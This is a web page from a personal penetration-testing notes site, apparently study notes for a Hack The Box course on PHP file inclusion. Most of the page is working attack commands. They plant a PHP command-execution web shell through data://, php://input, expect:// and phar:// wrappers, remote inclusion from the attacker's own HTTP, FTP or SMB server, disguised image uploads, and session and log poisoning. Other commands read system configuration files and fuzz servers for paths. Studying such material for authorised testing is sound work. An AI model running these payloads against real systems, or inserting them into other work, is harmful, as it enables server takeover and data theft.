@@ -1,0 +1,439 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>File Inclusion &mdash; CelestialTech-Notes R1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/dark.css?v=70edf1c7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=3b1ff954"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/dark_mode_js/default_dark.js?v=fd565c74"></script>
+      <script src="../../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="SSH Forwarding" href="SSH%20Forwarding.html" />
+    <link rel="prev" title="fingerprinting" href="../Reconnaissance/fingerprinting.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            CelestialTech-Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Offensive Methods</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../OFSEC/recon/Active%20Scanning.html">Active Scanning (T5195)</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../OFSEC/evasion/Evading%20EDR%20and%20AntiVirus.html">Evading EDR and AntiVirus</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Footprinting.html">Footprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Host%20Enumeration.html">Host Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/fingerprinting.html">fingerprinting</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Initial Access</span></p>
+<ul class="current">
+<li class="toctree-l1 current"><a class="current reference internal" href="#">File Inclusion</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#using-php-filters">Using PHP filters</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#using-php-wrappers">Using PHP Wrappers</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#rce-remote-code-execution">RCE (Remote code execution)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#using-the-input-wrapper">Using the input wrapper</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#using-the-expect-wrapper">Using the Expect Wrapper</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#remote-file-inclusion-rfi">Remote File Inclusion (RFI)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#using-a-web-server">Using a web server</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#using-an-ftp-server">Using an FTP server</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#using-a-smb-server">Using a SMB server</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#file-uploads">File Uploads</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#poisoning">Poisoning</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#session-poisoning">Session Poisoning</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#server-log-poisoning">Server Log Poisoning</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#automated-scanning">Automated Scanning</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#lfi-word-lists">LFI Word lists</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#fuzzing-server-files">Fuzzing Server Files</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#finding-the-location-of-the-logs">Finding the location of the logs</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#common-lfi-tools">Common LFI Tools</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#references">References</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20Forwarding.html">SSH Forwarding</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Dynamic%20Port%20Forwarding%20with%20SSH%20and%20SOCKS%20Tunneling.html">Dynamic Port Forwarding with SSH and SOCKS Tunneling</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Tools</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory.html">Active Directory</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bash.html">Bash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bettercap.html">bettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bitlocker.html">Bitlocker</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.py.html">bloodhound.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Certificates.html">Certificates</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cewl.html">cewl</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/chisel.html">chisel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html">Compliance Standards</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crawling.html">crawling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crowbar.html">crowbar</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crunch.html">crunch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cupp.html">cupp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/CVSS.html">CVSS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DKIM.html">DKIM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DMARC.html">DMARC</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DNS.html">DNS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsenum.html">dnsenum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsrecon.html">dnsrecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsx.html">dnsx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ettercap.html">ettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/evil-winrm.html">evil-winrm</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fail2ban.html">fail2ban</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ffuf.html">ffuf</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fierce.html">fierce</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20on%20Linux.html">File Encryption on Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20Windows.html">File Encryption on Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/finalRecon.html">finalRecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Firefox%20Decrypt.html">Firefox Decrypt</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/FTP.html">FTP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/git.html">git</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gobuster.html">gobuster</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hashcat.html">hashcat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hydra.html">hydra</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/impacket.html">imapacket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/invoke-TheHash.html">Invoke-TheHash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html">netstat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/subfinder.html">subfinder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html">smtp-user-enum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/winrm.html">winrm</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">CelestialTech-Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">File Inclusion</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/CPTS/Initial Access/File Inclusion.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="file-inclusion">
+<h1>File Inclusion<a class="headerlink" href="#file-inclusion" title="Link to this heading"></a></h1>
+<p>2024-12-03 07:50</p>
+<p>Status:</p>
+<p>Tags: <a class="reference external" href="CertifiedPenetrationTester">Certified Penetration Tester</a></p>
+<section id="using-php-filters">
+<h2>Using PHP filters<a class="headerlink" href="#using-php-filters" title="Link to this heading"></a></h2>
+<p>php filters can allow you to view the contents of unreadable files</p>
+<p>example 1 : step 1 - find file that you wish to read the source code of:( has no output)</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ffuf -w ~/HTB/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt  -u http://94.237.59.180:41191/FUZZ.php</span>
+
+<span class="go">found configure</span>
+</pre></div>
+</div>
+<p>Example 2: Use the Conversion Filter to read the file:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://94.237.59.180:41191/index.php?language=php://filter/read=convert.base64-encode/resource=configure</span>
+</pre></div>
+</div>
+</section>
+<section id="using-php-wrappers">
+<h2>Using PHP Wrappers<a class="headerlink" href="#using-php-wrappers" title="Link to this heading"></a></h2>
+<p>Example 1: Reading a system file</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="rce-remote-code-execution">
+<h2>RCE (Remote code execution)<a class="headerlink" href="#rce-remote-code-execution" title="Link to this heading"></a></h2>
+<p>This technique users the GET method</p>
+<p>Step 1: Encode the shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; | base64</span>
+</pre></div>
+</div>
+<p><em>Note: if the system does not take the GET command, encode the payload
+in system command.</em></p>
+<p>Step 2: From a web browser</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%</span>3D<span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>id
+</pre></div>
+</div>
+<p>Or from CURL</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -s &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="using-the-input-wrapper">
+<h2>Using the input wrapper<a class="headerlink" href="#using-the-input-wrapper" title="Link to this heading"></a></h2>
+<p>This technique users the POST method, so it must be enabled on the
+server</p>
+<p>Example: Using curl</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -s -X POST --data &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="using-the-expect-wrapper">
+<h2>Using the Expect Wrapper<a class="headerlink" href="#using-the-expect-wrapper" title="Link to this heading"></a></h2>
+<p>Rare that this is include. It has to be installed manually. This wrapper
+runs code without the shell.</p>
+<p>Example:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre></div>
+</div>
+</section>
+<section id="remote-file-inclusion-rfi">
+<h2>Remote File Inclusion (RFI)<a class="headerlink" href="#remote-file-inclusion-rfi" title="Link to this heading"></a></h2>
+<p>This is normally disabled by default In PHP the <code class="docutils literal notranslate"><span class="pre">allow_url_include</span></code>
+needs to be enabled for this to work.</p>
+</section>
+<section id="using-a-web-server">
+<h2>Using a web server<a class="headerlink" href="#using-a-web-server" title="Link to this heading"></a></h2>
+<p>Example 1: To test this try a RFI in the browser request</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php</span>
+</pre></div>
+</div>
+<p>If you see it’s own content encapsulated, it is vulnerable.</p>
+<p>Example 2: Performing a RFI attack. Step one: Encode a shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php</span>
+</pre></div>
+</div>
+<p>Step two: Host this on your server</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo python3 -m http.server &lt;LISTENING_PORT&gt;</span>
+</pre></div>
+</div>
+<p>Step three: Request this shell in the browser</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</span>
+</pre></div>
+</div>
+<p><strong>Tip:</strong>* We can examine the connection on our machine to ensure the
+request is being sent as we specified it. For example, if we saw an
+extra extension (.php) was appended to the request, then we can omit it
+from our payload*</p>
+</section>
+<section id="using-an-ftp-server">
+<h2>Using an FTP server<a class="headerlink" href="#using-an-ftp-server" title="Link to this heading"></a></h2>
+<p><strong>Note</strong><em>: This can also be hosted on your FTP server if http/https is
+blocked on a WAF</em></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@localhost/shell.php&amp;cmd=id&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="using-a-smb-server">
+<h2>Using a SMB server<a class="headerlink" href="#using-a-smb-server" title="Link to this heading"></a></h2>
+<p>Step 1: Start a Samba server
+.. code-block:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>impacket-smbserver -smb2support share $(pwd)
+</pre></div>
+</div>
+<p>Request the shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</span>
+</pre></div>
+</div>
+</section>
+<section id="file-uploads">
+<h2>File Uploads<a class="headerlink" href="#file-uploads" title="Link to this heading"></a></h2>
+<p>Example 1: Using LFI
+Step one: Create the shell with an image extension
+.. code-block:: console</p>
+<blockquote>
+<div><p>echo ‘GIF8&lt;?php system($_GET[“cmd”]); ?&gt;’ &gt; shell.gif</p>
+</div></blockquote>
+<p>Step two: Upload the file</p>
+<p>Step three: Find the image location</p>
+<p>Step four: Execute the file</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./profile_images/shell.gif&amp;cmd=id</span>
+</pre></div>
+</div>
+<p>Example 2: Using ZIP files ( Zip wrapper)</p>
+<p><a class="reference external" href="https://www.php.net/manual/en/wrappers.compression.php">https://www.php.net/manual/en/wrappers.compression.php</a></p>
+<p>Step 1: zipping the file</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</span>
+</pre></div>
+</div>
+<p><em>Note: If the server inspects and denies ZIP content this may not work</em></p>
+<p>Step 2: Upload the file</p>
+<p>Step 3: Execute the file</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</span>
+</pre></div>
+</div>
+<p>Example 3: Using PHAR wrapper</p>
+<p>Step 1: Write the following inside of shell.php</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&lt;?php</span>
+<span class="gp">$</span><span class="nv">phar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>Phar<span class="o">(</span><span class="s1">&#39;shell.phar&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">$</span>phar-&gt;startBuffering<span class="o">()</span><span class="p">;</span>
+<span class="gp">$</span>phar-&gt;addFromString<span class="o">(</span><span class="s1">&#39;shell.txt&#39;</span>,<span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="gp">$</span>phar-&gt;setStub<span class="o">(</span><span class="s1">&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span><span class="o">)</span><span class="p">;</span>
+
+<span class="gp">$</span>phar-&gt;stopBuffering<span class="o">()</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>Step 2: Compile the it into a phar file and rename it to shell.jpg</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">php --define phar.readonly=0 shell.php</span>
+<span class="go">mv shell.phar shell.jpg</span>
+</pre></div>
+</div>
+<p>Step 3: Upload the file to the server</p>
+<p>Step 4: Execute it with the phar wrapper</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</span>
+</pre></div>
+</div>
+</section>
+<section id="poisoning">
+<h2>Poisoning<a class="headerlink" href="#poisoning" title="Link to this heading"></a></h2>
+<section id="session-poisoning">
+<h3>Session Poisoning<a class="headerlink" href="#session-poisoning" title="Link to this heading"></a></h3>
+<p>By URL encoding a shell.</p>
+<p>Example: Step 1: urlencode the shell</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">urlencode &#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;</span>
+</pre></div>
+</div>
+<p>Step 2: Request this as an inclusion</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Browser:  http://94.237.59.180:40783/index.php?language=&lt;urlencoded-string&gt;</span>
+</pre></div>
+</div>
+<p>Step 3: Using your session id ( add <code class="docutils literal notranslate"><span class="pre">sess_</span></code> before it )</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Browser: /var/lib/php/sessions/sess_bpo3d1hh7nbb6p1frr98udaa60&amp;cmd=id</span>
+</pre></div>
+</div>
+</section>
+<section id="server-log-poisoning">
+<h3>Server Log Poisoning<a class="headerlink" href="#server-log-poisoning" title="Link to this heading"></a></h3>
+<p>By modifying the user-agent field we can specify a shell that will be
+copied to the log.
+.. code-block:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Temen@htb[/htb]$ curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -A &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;
+</pre></div>
+</div>
+<p>The by requesting the log with:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/log/apache2/access.log&amp;cmd=id</span>
+</pre></div>
+</div>
+</section>
+<section id="automated-scanning">
+<h3>Automated Scanning<a class="headerlink" href="#automated-scanning" title="Link to this heading"></a></h3>
+<p>Using <a class="reference external" href="../tools/ffuf">ffuf</a> to find parameters</p>
+<p>Looking for parameter names to use with your RFI/LFI attacks</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">Temen@htb[/htb]$ </span>ffuf<span class="w"> </span>-w<span class="w"> </span>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="lfi-word-lists">
+<h3>LFI Word lists<a class="headerlink" href="#lfi-word-lists" title="Link to this heading"></a></h3>
+<p>Download here:
+<a class="reference external" href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt</a></p>
+<p>Using it with <a class="reference external" href="../tools/ffuf">ffuf</a></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287</span>
+</pre></div>
+</div>
+</section>
+<section id="fuzzing-server-files">
+<h3>Fuzzing Server Files<a class="headerlink" href="#fuzzing-server-files" title="Link to this heading"></a></h3>
+<p>Finding the Webroot and structure of the server</p>
+<p>Part of Seclists, but can be downloaded for Linux:
+<a class="reference external" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt</a></p>
+<p>And for Windows
+<a class="reference external" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt</a></p>
+<p>Example:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="finding-the-location-of-the-logs">
+<h3>Finding the location of the logs<a class="headerlink" href="#finding-the-location-of-the-logs" title="Link to this heading"></a></h3>
+<p>Example: Using the linux LFI list</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39;</span>
+</pre></div>
+</div>
+<p>Example 2: Find logs by asking the conf file</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/apache2/apache2.conf</span>
+</pre></div>
+</div>
+</section>
+<section id="common-lfi-tools">
+<h3>Common LFI Tools<a class="headerlink" href="#common-lfi-tools" title="Link to this heading"></a></h3>
+<p><a class="reference external" href="https://github.com/mzfr/liffy">https://github.com/mzfr/liffy</a></p>
+</section>
+</section>
+<section id="references">
+<h2>References<a class="headerlink" href="#references" title="Link to this heading"></a></h2>
+<p><a class="reference external" href="https://academy.hackthebox.com/module/23/section/250">https://academy.hackthebox.com/module/23/section/250</a>
+<a class="reference external" href="https://www.php.net/manual/en/wrappers.data.php">https://www.php.net/manual/en/wrappers.data.php</a>
+<a class="reference external" href="https://academy.hackthebox.com/module/23/section/253">https://academy.hackthebox.com/module/23/section/253</a>
+<a class="reference external" href="https://www.php.net/manual/en/wrappers.php.php">https://www.php.net/manual/en/wrappers.php.php</a>
+<a class="reference external" href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion">https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion</a></p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="../Reconnaissance/fingerprinting.html" class="btn btn-neutral float-left" title="fingerprinting" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="SSH%20Forwarding.html" class="btn btn-neutral float-right" title="SSH Forwarding" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2024, James Jamieson.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
